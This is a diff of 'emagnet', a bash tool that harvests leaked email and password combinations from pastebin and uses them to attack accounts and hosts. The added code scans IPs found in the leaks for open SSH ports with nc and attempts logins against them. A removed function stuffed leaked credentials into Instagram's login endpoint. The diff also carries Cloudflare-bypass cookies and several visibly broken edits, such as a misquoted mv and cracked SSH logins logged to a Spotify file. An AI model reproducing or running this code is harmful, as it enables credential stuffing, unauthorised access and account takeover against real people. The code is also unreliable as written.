@@ -38,8 +38,9 @@
 ####  program, then also delete it here.                                   ####
 ####                                                                       ####
 ###############################################################################
-#################################################################################
+###############################################################################
 ### Last Modified: 06:58:05 - 2020-07-16
+CONF="$HOME/.config/emagnet/emagnet.conf"
 CURRENT_VERSION="3.4.3"
 
 #### Author of emagnet will be printed if --author or -a is being used
@@ -66,19 +67,18 @@ EOF
 emagnet_conf() {
 if ! [[ -f "$HOME/.config/emagnet/emagnet.conf" ]]; then
     mkdir -p "$HOME/.config/emagnet/tmp"
-    cp "./emagnet.conf" "$HOME/.config/emagnet/" &> /dev/null
+    cp -rn "./emagnet.conf" "$HOME/.config/emagnet/" &> /dev/null
 fi
 
     CONF="$HOME/.config/emagnet/emagnet.conf"
     source "$CONF" &> /dev/null
 }
-
 #### Required tools for emagnet
 emagnet_required_tools() {
-     for cmd in wget curl; do 
-         which $cmd &> /dev/null
-             if [[ "$?" -gt 0 ]]; then 
-                 echo -e "$basename$0: internal error -- $cmd is required to be installed, exiting."
+     for packages in "wget curl"; do
+         which ${packages} &> /dev/null
+             if [[ "$?" -gt "0" ]]; then
+                 echo -e "$basename$0: internal error -- ${cmd} is required to be installed, exiting."
                  exit 1
              fi
      done
@@ -88,8 +88,8 @@ emagnet_required_tools() {
 emagnet_version() {
 if [[ "$VERSION" != "$CURRENT_VERSION" ]]; then
    if ! [[ -f "./emagnet.conf" ]]; then
-               mv $HOME/.config/emagnet/emagnet.conf $HOME/.config/emagnet/emagnet.conf.bak &> /dev/null
-               cp ./emagnet.conf $HOME/.config/emagnet/ &> /dev/null
+               mv" $HOME/.config/emagnet/emagnet.conf" "$HOME/.config/emagnet/emagnet.conf.bak" &> /dev/null
+               cp "./emagnet.conf" "$HOME/.config/emagnet/" &> /dev/null
 else
                echo -e "$basename$0: internal error -- You are using an old emagnet.conf and emagnet.conf can't be found..."
                echo -e "$basename$0: internal error -- Write current emagnet.conf to ~/.config/emagnet/emagnet.conf by below command..."
@@ -101,14 +101,13 @@ else
 fi
 }
 
-
 # Check if we using right config file...
 emagnet_check_version() {
-if [[ -f $HOME/.config/emagnet/emagnet.conf ]]; then
-grep -qio 'version=[0-9].*' $HOME/.config/emagnet/emagnet.conf
+if [[ -f "$HOME/.config/emagnet/emagnet.conf" ]]; then
+grep -qio 'version=[0-9].*' "$HOME/.config/emagnet/emagnet.conf"
    if [[ $? -eq "0" ]]; then 
-        mv $HOME/.config/emagnet/emagnet.conf $HOME/.config/emagnet/emagnet.conf.bak
-        cp ./emagnet.conf $HOME/.config/emagnet/ &> /dev/null
+        mv "$HOME/.config/emagnet/emagnet.conf" "$HOME/.config/emagnet/emagnet.conf.bak"
+        cp "./emagnet.conf" "$HOME/.config/emagnet/" &> /dev/null
    fi
 fi
 }
@@ -193,10 +192,8 @@ emagnet_mustbefilled() {
 # and also because we dont want to count data from those files twice...
 emagnet_move_realtime() {
          mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
-         rm "$HOME/.config/emagnet/tmp/.emagnet" "$HOME/.config/emagnet/tmp/.emagnet1"  &> /dev/null
+         rm "$HOME/.config/emagnet/tmp/.emagnet-*"  &> /dev/null
  }
-
-
 
 # Check if we are allowed to visit pastebin before doing next function
 emagnet_check_pastebin() {
@@ -241,7 +238,8 @@ cat << "EOF"
      `'                  `OObNNNNNdOO'                   `'
                            `~OOOOO~'
 EOF
-printf "%64s \n\n" | tr ' ' '='
+
+printf "\n%64s \n\n" | tr ' ' '='
 }
 
 emagnet_usage() {
@@ -250,20 +248,14 @@ cat << EOF
 Usage: ./$basename$0 [--author] [--emagnet] [--option] .....
 
   -a, --author        Show author information
-  -A, --api           If you have a PRO account, set this to true
   -b, --backup        Create a compressed archive
                       - Available options: all/archive/incoming
-  -B, --blocked       Check if your current IP has been blocked
   -d, --stats         Count total passwords, mail addresses and how many files you downloaded 
   -l, --license       Show license information
   -h, --help          Display this very helpful text
-  -n, --notify        Set notifications on or off
   -t, --time          Set refresh time in seconds
-  -v, --vpn           Toggle VPN on or off (Linux Only)
-                      - Available options: true/false
                       Use: -v -p <provider> for set provider
   -V, --version       Displays version information.
-  -p, --proxy         Set ssh tunnel on or off
   -i, --ip            Print you current WAN IPv4/IPv6
   -e, --emagnet       Download latest uploaded files on pastebin
                       and store email addresses and passwords
@@ -271,17 +263,12 @@ Usage: ./$basename$0 [--author] [--emagnet] [--option] .....
   -g, --bruteforce    Same as above '-e' with brute-force mode on
                       - Available options: gmail/ssh/spotify/instagram/rdp
   -k, --kill          Kill emagnet ghost sessions
-  -m, --merge         Merge all log files from incoming to archive
-  -M, --move          Move all downloaded files to archive
-  -S, --search        Search for email addresses and various stuff
+  -m, --move          Move and Merge all files to archive
   -q, --quiet         Run emagnet in a screen
-  -x, --syntax        Download uploads sorted by syntax
-                      - Valid syntaxes available on pastebin.com/languages
 
 EOF
 }
 
-CONF="$HOME/.config/emagnet/emagnet.conf"
 
 #### Just for make it easier to read main script
 emagnet_clear() {
@@ -304,14 +291,9 @@ emagnet_optional(){
 
 # Check so all paths has been created so we can use emagnet
 emagnet_paths() {
-if ! [[ -d ${EMAGNETALL} ]]; then
+[[ ! -d ${EMAGNETALL} ]] && \
       PATHS="${EMAGNETHOME} ${EMAGNETCRACKED} ${EMAGNETDB} ${EMAGNETPW} ${EMAGNETTEMP} ${EMAGNETCRAP} ${EMAGNETALL} ${EMAGNETARCHIVE} ${EMAGNETLOGS}"
-         for DIRS in ${PATHS}; do 
-          if ! [[ -d "${DIRS}" ]]; then
-             mkdir -p "${DIRS}" &> /dev/null
-          fi
-         done
-fi
+         for DIRS in ${PATHS}; do [[ ! -d "${DIRS}" ]] && mkdir -p "${DIRS}" &> /dev/null;done
 }
 
 #### Run emagnet in a screen
@@ -382,47 +364,6 @@ fi
         done
 }
 
-###############################################################################
-#### If you have many daily dirs in incoming folder then we send everything ###
-#### to our archive dir instead and merging files so everything is sorted  ####
-#### in one file instead of all log files in incoming dir                  ####
-###############################################################################
-emagnet_merge() {
-EMPTY="$(ls $EMAGNET/incoming/*/logs/|wc -l)"
-if [[ "$EMPTY" = "0" ]]; then echo -e "$basename$0: internal error -- nothing to merge";exit 1;fi
-DAYDIRS="$(ls $EMAGNET/incoming/|wc -l)"
-DAYDIRS2="$(ls $EMAGNET/incoming/)"
-LOGFILES="$(ls $EMAGNET/incoming/*/logs/*|wc -l)"
-TOTM="$(cat $EMAGNET/incoming/*/logs/emails-from-pastebin.txt|wc -l)"         # Total Mail Addresses
-TOTP="$(cat $EMAGNET/incoming/*/logs/passwords-from-pastebin.txt|wc -l)"      # Total passwords
-TOTU="$(cat $EMAGNET/incoming/*/logs/pastebin-urls.txt|wc -l)"                # Total Urls
-          emagnet_clear;emagnet_banner
-          printf "%10s Merging \e[1;36m${LOGFILES}\e[0m log files from \e[1;36m${DAYDIRS}\e[0m day directories\n\n"
-        printf "%64s \n\n" | tr ' ' '='
-        LOGDATE="$(ls $EMAGNET/incoming/|xargs|sed 's/ /, /g')"
-           for LOGDATE2 in "$(ls $EMAGNET/incoming/)"; do
-            echo -e ",-> Merging logs from: $LOGDATE \n|"
-            #logfiles="cracked-ssh-passwords.txt cracked-gmail-passwords.txt cracked-instagram-passwords.txt cracked-spotify-passwords.txt emagnet.log emails-from-pastebin.txt passwords-from-pastebin.txt pastebin-urls.txt"
-            find $EMAGNET/incoming/*/logs/ -maxdepth 1|sed '/\/$/d' > $HOME/emagnet/.emagnet-temp-merge.txt
-            touch "$EMAGNETARCHIVE/logs/$logfiles" &> /dev/null
-              while read logs; do 
-                  echo "$logs" >> "$EMAGNETARCHIVE/logs/$logfiles"; 
-                if [[ "$?" -eq "0" ]]; then
-                  printf "| %2d) [MERGED] %.100s %s\n" "$(( ++cnt ))" "$logs'"
-                  sleep 1
-                else
-            printf "\n| %2d) [FAILED] %.31s %s" "$(( ++cnt ))" "$logs"
-                  sleep 1
-                fi
-                  done < $HOME/emagnet/.emagnet-temp-merge.txt
-                  sleep 0.2
-            done
-        printf "|\n"
-        sleep 0.2
-        rm $HOME/emagnet/.emagnet-temp-merge.txt
-        printf "'- Successfully merged \e[1;32m${TOTM}\e[0m emails, \e[1;34m${TOTP}\e[0m passwords and \e[1;36m${TOTU}\e[0m urls...\n\n"
-
-}
 
 # MESSAGE WHILE RUNNING
 emagnet_analyzer() {
@@ -457,32 +398,63 @@ temp_cnt=${wait_time}
 }
 
 emagnet_move_files() {
-EMPTY="$(ls $EMAGNET/incoming/*/*/|wc -l)"
-if [[ "$EMPTY" -lt "1" ]]; then
-   echo -e "$basename$0: internal error -- there is nothing to move"
-   exit 1
+find $EMAGNET/incoming -maxdepth 1 -type d|sed '1d'|grep '.' &> /dev/null
+[[ "$?" -gt "0" ]] && echo -e "$basename$0: internal error -- you have no daily directories in $EMAGNET/incoming, nothing to move..." || \
+[[ -d "$EMAGNETARCHIVE/all-files" ]] && mkdir -p "$EMAGNETARCHIVE"/{all-files,email-files,password-files,logs}
+
+  if [[ -d /root/emagnet/incoming/*/all-files/ ]]; then 
+        echo -e "Moved:    [\e[1;31m00\e[0m] files to: $EMAGNETARCHIVE/all-files..."
+  else
+        ALL_FILES="$(ls $EMAGNET/incoming/*/all-files|wc -l)" 
+        echo -e "Moved:    [\e[1;31m$ALL_FILES\e[0m] files to: $EMAGNETARCHIVE/all-files..."  
+        find /root/emagnet/incoming/*/all-files -type f -exec cp {}  $EMAGNETARCHIVE/all-files \;
+  fi
+
+  if [[ -d "/root/emagnet/incoming/$(date +%Y)*/email-files/" ]]; then 
+         echo -e "Moved:    [\e[1;31m00\e[0m] email-files to: $EMAGNETARCHIVE/email-files..."
+  else
+         EMAIL_FILES="$(ls $EMAGNET/incoming/*/email-files|wc -l)"
+         echo -e "Moved:    [\e[1;31m$EMAIL_FILES\e[0m] email-files to: $EMAGNETARCHIVE/email-files..." 
+         find $HOME/emagnet/incoming/*/email-files -type f -exec cp {} $EMAGNETARCHIVE/email-files/  \;
+
+  fi
+
+ if [[ -d "/root/emagnet/incoming/$(date +%Y)*/password-files" ]]; then 
+         echo -e "Moved:    [\e[1;31m00\e[0m] password-files to: $EMAGNETARCHIVE/email-files..."
+  else
+       PASSWORD_FILES="$(ls $EMAGNET/incoming/*/password-files|wc -l)"
+         echo -e "Moved:    [\e[1;31m$PASSWORD_FILES\e[0m] password-files to: $EMAGNETARCHIVE/password-files..." 
+         find $HOME/emagnet/incoming/*/password-files -type f -exec cp {} $EMAGNETARCHIVE/password-files/ \;
 fi
 
-  if [[ ! -d "$EMAGNETARCHIVE/emagnet" ]]; then
-    mkdir -p "$EMAGNETARCHIVE/all-files"
-    mkdir -p "$EMAGNETARCHIVE/email-files"
-    mkdir -p "$EMAGNETARCHIVE/password-files"
-    mkdir -p "$EMAGNETARCHIVE/logs"
-  fi
-       printf "%s" "Moving all incoming files to archive"
-       cp -rn $EMAGNET/incoming/*/all-files/* $EMAGNETARCHIVE/all-files/
-       cp -rn $EMAGNET/incoming/*/email-files/* $EMAGNETARCHIVE/email-files/
-       cp -rn $EMAGNET/incoming/*/password-files/* $EMAGNETARCHIVE/password-files/
-       printf "%s\n" "...done."
-          read -p "Wipe incoming directories (y/n): " cleanup
+ if [[ -f "/root/emagnet/incoming/$(date +%Y)*/logs/emails-from-pastebin.txt" ]]; then 
+       echo -e "Merged:   [\e[1;31m00\e[0m] email addresses..."
+ else
+       EMAIL_ADDRESSES="$(cat $EMAGNET/incoming/*/logs/email-files|wc -l)" 
+       echo -e "Merged:   [\e[1;31m$EMAIL_ADDRESSES\e[0m] email addresses to: $EMAGNETARCHIVE/logs/email-files..."
+       cat /root/emagnet/incoming/$(date +%Y)*/logs/emails-from-pastebin.txt >> $EMAGNETARCHIVE/logs/emails-from-pastebin.txt 
+ fi
+
+ if [[ -f "/root/emagnet/incoming/$(date +%Y)*/logs/passwords-from-pastebin.txt" ]]; then 
+       echo -e "Merged:   [\e[1;31m00\e[0m] email and passwords combos to ..."
+ else
+       PASSWORDS="$(cat $EMAGNET/incoming/*/logs/passwords-from-pastebin.txt|wc -l)" 
+       echo -e "Merged:   [\e[1;31m$PASSWORDS\e[0m] email and passwords combos to: $EMAGNETARCHIVE/logs/passwords-from-pastebin.txt"
+       cat /root/emagnet/incoming/$(date +%Y)*/logs/passwords-from-pastebin.txt >> $EMAGNETARCHIVE/logs/passwords-from-pastebin.txt
+ fi
+
+
+echo -e "\nAll done"
+
+          read -p "Wipe incoming directories (Y/n): " cleanup
              if [[ "$cleanup" = "y" ]]; then
               rm -rf "$EMAGNET/incoming/"
-              printf "\e[1;31mWiped\e[0m: $EMAGNET/incoming..\nDone..\n"
+              printf "\e[1;31mWiped\e[0m all daily directories in: $EMAGNET/incoming...\nAll Done...\n"
              else
-              printf "\nAborted..\n"
+              printf "Aborted..\n"
+ 
             fi
 }
-
 emagnet_count_down() {
             emagnet_paths
             emagnet_conf
@@ -626,82 +598,53 @@ grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETHOME/.temp" \
               echo -e "[\e[1;31m<<\e[0m] - Wrong Login: $line"
             fi
               sleep 4
-       done < $RDP_TARGETS
+       done < $RDPTARGETS
    fi
         sleep 4
 }
 
 emagnet_sshbruter() {
-hash pssh &> /dev/null
-( [[ $? -eq "0" ]] || echo -e "$basename$0: internal error -- pssh is required to be installed"; exit 1 )
-emagnet_conf
+source $HOME/.config/emagnet/emagnet.conf &> /dev/null
+hash ssh &> /dev/null
+( [[ $? -eq "0" ]] || echo -e "$basename$0: internal error -- ssh package is required to be installed, exiting..."; exit 1 )
 
 if [[ -z "$SSHPASS" ]]; then
    echo -e "You must set a password to use during the attack"
    read -p "Enter a password or hit enter for default (Default: root) " sshpassb
-   echo ""
      if [[ -n "$sshpassb" ]]; then
-       sed -i '183d' "$CONF"
-       sed -i "183 i SSHPASS=$sshpassb" "$CONF"
-     else
-       sed -i '183d' "$CONF"
-       sed -i "183 i SSHPASS=root" "$CONF"
+       sed -i "s/SSHPASS=/SSHPASS=$sshpassb" "$CONF"
      fi
 fi
 
-SKIPLIST="^0\|^[0-9].[0-9].[0-9].*\|^[0-9]\..*\|^10\..*\|^192.168.*"
-#grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETTEMP" \
-grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETALL" \
-|awk -F':' '{print $2}' \
-|awk -F, '!seen[$1]++' > "$SSHPORTSCAN"
+SKIPLIST="^0.*\|^[0-9].[0-9].[0-9].*\|^[0-9]\..*\|^10\..*\|^192.168.*\|^0\.\|^1\.\|^2\.\|^3\.\|^4\.\|^5\.\|^6\.\|^7\.\|^8\.\|^10."
+grep -E -ra -o '([0-9]{1,3}[\.]){3}[0-9]{1,3}' $EMAGNET|cut -d: -f2|grep -v '^0.*\|^[0-9].[0-9].[0-9].*\|^[0-9]\..*\|^10\..*\|^192.168.*\|^0.\|^1\.\|^2\.\|^3\.\|^4\.\|^5\.\|^6\.\|^7\.\|^8\.\|^9\.\|\\'|awk '!seen[$0]++' > ".emagnet-ipv4"
+SSHPORTOPEN="$(cat .emagnet-ipv4|wc -l)"
+#rm "./emagnet-ipv4"
 
-   if [[ $(cat $SSHPORTSCAN|wc -l) -lt "1" ]]; then
-        echo -e "                       - IPv4 Addresses Found \r             [\e[1;31m00\e[0m] "
+   if [[ ${SSHPORTOPEN} = "0" ]]; then
+        echo -e "                       - IPv4 Addresses Found \r            [\e[1;32m00\e[0m]"
+   else
+        echo -e "                       - IPv4 Addresses Found \r             [\e[1;32m$SSHPORTOPEN\e[0m] "
+        xargs -i -P $THREADS timeout 0.5 nc -zvn {} ${SSHPORT} < $SSHPORTSCAN 2>&1 |grep 'succeeded'|grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' > $SSHTARGETS
+        echo -e "                       - IPv4 Addresses Port $SSHPORT Open\r             [\e[1;32m$(cat $SSHTARGETS|wc -l)\e[0m] "
         sleep 2
-        else
-        echo -e "                       - IPv4 Addresses Found \r             [\e[1;32m$(cat $SSHPORTSCAN|wc -l)\e[0m] "
-        sleep 2
-        xargs -i -P $THREADS timeout 0.5 nc -zvn {} 22 < $SSHPORTSCAN 2>&1 |grep 'open'|grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' > $SSHTARGETS
-        echo -e "                       - Has Port $SSHPORT Open\r             [\e[1;32m$(cat $SSHTARGETS|wc -l)\e[0m] "
         printf "\n%64s\n" | tr ' ' '='
-        printf "\n%15s";printf "BRUTE FORCING -- \e[1;34mSSH\e[0m TARGETS\e[0m\n\n"
-        sleep 2
-        sshpass -p "$SSHPASS" pssh  -O "StrictHostKeyChecking=no" -I -h $SSHTARGETS -i "uptime" < $SSHTARGETS |grep --color -i 'success\|failure' 
+        printf "\n%16s";printf "BRUTE FORCING -- \e[1;34mSSH\e[0m TARGETS\e[0m\n\n"
+        sleep 1
+
+    while read line; do
+        timeout 0.5 ssh  -o "StrictHostKeyChecking=no" ${SSHUSER}@${line}:${SSHPORT} "date;exit" &> /dev/null
+         if [[ "$?" = "0" ]]; then
+            echo -e "[\e[1;32m>>\e[0m] - Cracked: $SSHUSER@$line"
+            echo -e "${SSHUSER}@${line}" >> $EMAGNETCRACKED/cracked-spotify-passwords.txt
+         else
+            echo -e "[\e[1;31m<<\e[0m] - Wrong pass for: ${SSHUSER}@${line}"
+         fi
+    done < $SSHTARGETS
+         sleep 1
    fi
         sleep 4
-}
 
-emagnet_instagrambruter() {
-URL="https://www.instagram.com/accounts/login/ajax/?hl=jp"
-      grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
-    |awk '{print $1}' \
-    |cut -d':' -f2,3 \
-    |cut -d'|' -f1 \
-    |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt   
-while read instagramlogin; do
-    INSTAGRAM_USER="$(echo $instagramlogin|cut -d':' -f1,2|sed 's/:/\&password\=/g')"
-    INSTAGRAM_PASS="$(echo $instagramlogin|cut -d':' -f2)"
-    INSTAGRAM_TOKEN="$(< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c33)"
-    curl -s $URL --data "username=$INSTAGRAM_USER&password=$INSTAGRAM_PASS" -H "x-csrftoken: $INSTAGRAM_TOKEN"|awk '{print $4}'|grep -iq 'checkpoint_required'
- if [[ $? -eq "0" ]]; then
-         echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"    
-         echo -e "================================================================"             >>    "$EMAGNETCRACKED/cracked-instagram-passwords.txt"
-         echo -e "[+] Login Details For INSTAGRAM - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"        >>    "$EMAGNETCRACKED/cracked-instasgram-passwords.txt"
-         echo -e "[+]------------------------------------------------------------"              >>    "$EMAGNETCRACKED/cracked-instagram-passwords.txt"
-         echo -e "[+] Username: ${INSTAGRAM_USER}"                                              >>    "$EMAGNETCRACKED/cracked-instagram-passwords.txt"
-         echo -e "[+] Password: ${INSTAGRAM_PASS}"                                              >>    "$EMAGNETCRACKED/cracked-instagram-passwords.txt"
-         echo -e "================================================================\n\n"         >>    "$EMAGNETCRACKED/cracked-instagram-passwords.txt"
-         echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"    >>    "$HOME/.config/emagnet/tmp/.emagnet-cracked"
-         echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"      >>    "$HOME/.config/emagnet/tmp/.emagnet-failed"
-  else
-         echo -e "[\e[1;31m<<\e[0m] - Wrong Password: $instagramlogin"
- fi
-#done < $HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt
-done < "$SPOTIFY_TARGETS"
-         printf "%64s \n\n" | tr ' ' '='
-         sleep 3
-         rm "$HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt"
-         sleep 0
 }
 
 emagnet_spotify_bruter() {
@@ -710,7 +653,7 @@ SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
     |awk '{print $1}' \
     |cut -d':' -f2,3 \
     |cut -d'|' -f1 \
-    |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> "$SPOTIFY_TARGETS"
+    |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> test # "$SPOTIFY_TARGETS"
        while read line; do
                 SPOTIFY_USER="$(echo $line|cut -d: -f1)"
                 SPOTIFY_PASS="$(echo $line|cut -d: -f2)"
@@ -772,39 +715,8 @@ else
 fi
 }
 
-emagnet_syntax() {
-if [[ -z "$SYNTAX2DL" ]]; then 
-    echo -e "$basename$0: internal error -- you must include a syntax language (ex: bash, python or perl)."
-    exit 1
-fi
-
-
-
- curl -Ls "https://pastebin.com/archive/$SYNTAX2DL" \
-|grep -o '<a href="/........' \
-|cut -d'/' -f2 \
-|grep -E '[0-9]{1,4}' \
-|sed 's/^/https:\/\/pastebin.com\/raw\//g' > "$HOME/.config/emagnet/tmp/.emagnet-syntaxes-urls"
- grep -q "$SYNTAX2DL" "$HOME/.config/emagnet/tmp/.emagnet-syntaxes"
-
-emagnet_check_pastebin
-if [[ "$?" = "0" ]]; then
-     
-     printf "Downloading $(cat $HOME/.config/emagnet/tmp/.emagnet-syntaxes-urls|wc -l) ${SYNTAX2DL} files.."
-     mkdir -p "$EMAGNETSYNTAX/$SYNTAX2DL"
- else
-     curl -Ls "https://pastebin.com/languages" \
-     |grep -o 'href="/archive/............' \
-     |cut -d'<' -f1 \
-     |cut -d'/' -f3 \
-     |cut -d'"' -f1 > $HOME/.config/emagnet/tmp/.emagnet-syntaxes
-      echo -e "$basename$0: internal error -- $SYNTAX2DL is not a valid syntax language.."
-      echo -e "try 'cat $HOME/.config/emagnet/tmp/.emagnet-syntaxes' for find valid syntaxes"
-      exit 1
-fi
-}
-
 emagnet_main() {
+source "${CONF}" &> /dev/null
 # ------------------------------------------------------------
 # BETA - CHOOSE ONE?
 #curl -s https://scrape.pastebin.com/api_scraping.php -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Cookie: _ga=GA1.2.1092992254.1592458160; cf_clearance=427618303dfe7f40fd4bed06784b682ff11e9492-1593096187-0-d1784d20-250'|egrep -oi 'https:\/\/scrape.*php.*"'|sed 's/.$//g' > $HOME/.config/emagnet/tmp/.emagnet-temp1
@@ -813,7 +725,7 @@ emagnet_main() {
 
 # Check if PROXY is set to true (ssh/tunnel)
 if [[ $PROXY = "true" ]]; then 
-   CURL="curl -x socks5h://$PROXYHOST:$PROXYPORT "
+   CURL="curl -x socks5h://$PROXYHOST:$PROXYPORT"
 else
     CURL="curl -s "
 fi
@@ -821,8 +733,8 @@ fi
 # We now use nr1.nu instead for see recent uploads 
 # since patebin now have filtered default syntax 
 # "text" from being listed, lmao :)
-source "$HOME/.config/emagnet/emagnet.conf" &> /dev/null
-curl -H "$USERAGENT" -Ls "$PASTEBIN"|grep -i "https"|sort|awk '!seen[$0]++' > "$HOME/.config/emagnet/tmp/.emagnet-temp1"
+
+$CURL -H "$USERAGENT" -Ls "$PASTEBIN"|grep -i "https"|sort|awk '!seen[$0]++' > "$HOME/.config/emagnet/tmp/.emagnet-temp1"
 ls -1 "$EMAGNETALL"|sort|awk '!seen[$0]++'|sed 's/^/https:\/\/pastebin.com\/raw\//g' > "$HOME/.config/emagnet/tmp/.emagnet-temp2"
 grep  -v -x -F -f "$HOME/.config/emagnet/tmp/.emagnet-temp2" "$HOME/.config/emagnet/tmp/.emagnet-temp1"|awk -F, '!seen[$1]++' > "$HOME/.config/emagnet/tmp/.emagnet-download"
 
@@ -837,15 +749,19 @@ grep  -v -x -F -f "$HOME/.config/emagnet/tmp/.emagnet-temp2" "$HOME/.config/emag
 # See how you can bypass cloudfare here: 
 # https://pastebin.com/raw/8MfnBW7r
 #-----------------------------------------------------
-curl -sL https://pastebin.com/|grep -io "What can I do to" &> /dev/null
+if [[ $PROXY = "true" ]]; then
+  curl -sL -x socks5h://$PROXYHOST:$PROXYPORT https://pastebin.com/ |grep -io "What can I do to" &> /dev/null
+else
+  curl -sL https://pastebin.com/ |grep -io "What can I do to" &> /dev/null
+fi
+
 if [[ "$?" = "0" ]]; then
    while read line; do
-        source "$HOME/.config/emagnet/emagnet.conf" &> /dev/null       
+        source "$HOME/.config/emagnet/emagnet.conf" &> /dev/null
         curl -sL "$line" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Cookie: __cfduid=d7d79b8cd36362aa95e3b90fcf3acc7491594533376; _ga=GA1.2.1884747867.1594742009; __gads=ID=38e8a6bea2852c12:T=1594734804:S=ALNI_MYI6CC_VHeBWyI_jkDdMgjO0Ny2zw; cf_clearance=dfb094f0ccac0b6649ebafa292bb81de7b37b94e-1594840687-0-1za25cfc5cze628b45azf578cfb9-250; _gid=GA1.2.423143590.1594877466' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' -H 'TE: Trailers' -o "$EMAGNETTEMP/$(echo -e $line|sed "s:..*/::")"
     done < "$HOME/.config/emagnet/tmp/.emagnet-download"
 else
-# Downloading new pastes we found, no duplicates will be downloaded of course - This is __ALOT__ faster then while loop above - But this wont work when cloudfare will become a problem for us :)
-     xargs -P "$(xargs --show-limits -s 1 2>&1|grep -i "parallelism"|awk '{print $8}')" -n 1 wget --user-agent="${USERAGENT}" -q -nc -P "$EMAGNETTEMP" < "$HOME/.config/emagnet/tmp/.emagnet-download" &> /dev/null
+     xargs -P "$(xargs --show-limits -s 1 2>&1|grep -i "parallelism"|awk '{print $8}')" -n 1 wget --user-agent="${USERAGENT}" -q -nc -P "$EMAGNETTEMP" < $HOME/.config/emagnet/tmp/.emagnet-download &> /dev/null
 fi
 # Print total files on a better way
       tt="$(ls $EMAGNETTEMP| wc -l)"
@@ -861,7 +777,7 @@ pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EM
 # We want to clear screen after we counted stuff
     emagnet_clear
     emagnet_banner
-        
+    emagnet_move_realtime
 # If we found both passwords and email addresses then we do below 
 # --------------------------------------------------------------- 
 # Notice about sleep:                                             
@@ -875,6 +791,7 @@ if [[ "$pt" -gt "0" ]] && [[ "$et" -gt "0" ]]; then
             echo -e "${el}" >> $EMAGNETLOGS/emails-from-pastebin.txt
             cp -rn ${ef} $EMAGNETDB/ &> /dev/null
             cp -rn ${pf} $EMAGNETPW/ &> /dev/null
+            # We want to move everything AFTER we bruteforced ;) 
             if [[ ${tt} -lt "10" ]]; then tt=0${tt};fi
             if [[ ${et} -lt "10" ]]; then et=0${et};fi
             if [[ ${pt} -lt "10" ]]; then pt=0${pt};fi
@@ -889,7 +806,7 @@ if [[ "$pt" -gt "0" ]] && [[ "$et" -gt "0" ]]; then
                   emagnet_gmail_bruter
                 elif [[ "$SBRUTEFORCE" = "true" ]]; then
                   printf "%64s \n\n" | tr ' ' '='
-                  printf "%15s";printf "BRUTE FORCING -- \e[1;34mSSH\e[0m ACCOUNTS\e[0m\n\n"
+                  printf "%16s";printf "BRUTE FORCING -- \e[1;34mSSH\e[0m ACCOUNTS\e[0m\n\n"
                   emagnet_sshbruter
                 elif [[ "$PBRUTEFORCE" = "true" ]]; then
                   printf "%64s \n\n" | tr ' ' '='
@@ -906,8 +823,8 @@ if [[ "$pt" -gt "0" ]] && [[ "$et" -gt "0" ]]; then
                 else
                   sleep 0
                fi
-# We want to move everything AFTER we bruteforced ;) 
-                 emagnet_move_realtime
+
+
 
 # If we found no passwords and mail addresses only we do below
 elif [[ "$pt" = "0" ]] && [[ "$et" -gt "0" ]]; then
@@ -919,7 +836,6 @@ elif [[ "$pt" = "0" ]] && [[ "$et" -gt "0" ]]; then
             echo -e "                       - Files Downloaded\r             [\e[1;32m$tt\e[0m] "
             echo -e "                       - Passwords Found \r             [\e[1;31m00\e[0m] "
             echo -e "                       - Email Addresses Found \r             [\e[1;32m$et\e[0m] \n"
-            emagnet_move_realtime
             sleep 2                         
             
 # If we found no passwords and no mail addresses we print 00 
@@ -930,8 +846,7 @@ elif [[ "$pt" = "0" ]] && [[ "$et" = "0" ]] && [[ ${tt} = "0" ]]; then
             if [[ ${tt} -lt "10" ]]; then tt=0${tt};fi
             echo -e "                       - Files Downloaded\r             [\e[1;32m$tt\e[0m] "
             echo -e "                       - Passwords found \r             [\e[1;31m00\e[0m] "
-            echo -e "                       - Email Addresses Found \r             [\e[1;31m00\e[0m] \n"        
-            emagnet_move_realtime
+            echo -e "                       - Email Addresses Found \r             [\e[1;31m00\e[0m] \n"       
             sleep 2
 fi
 
@@ -973,172 +888,41 @@ if ! [[ -f "$CONF" ]]; then
 fi
 }
 
-emagnet_search() {
-  emagnet_required_tools
-    dt="$(date +%d%m%y)"
-    emagnet_conf
-    emagnet_clear
-    emagnet_banner
-    echo -e "           * * * * *  EMAGNET SEARCH MENU  * * * * * \n"
-    echo -e "=================================================================\n"
-    echo -e " [1] - Email Addresses"
-    echo -e " [2] - Email Addresses incl. Passwords"
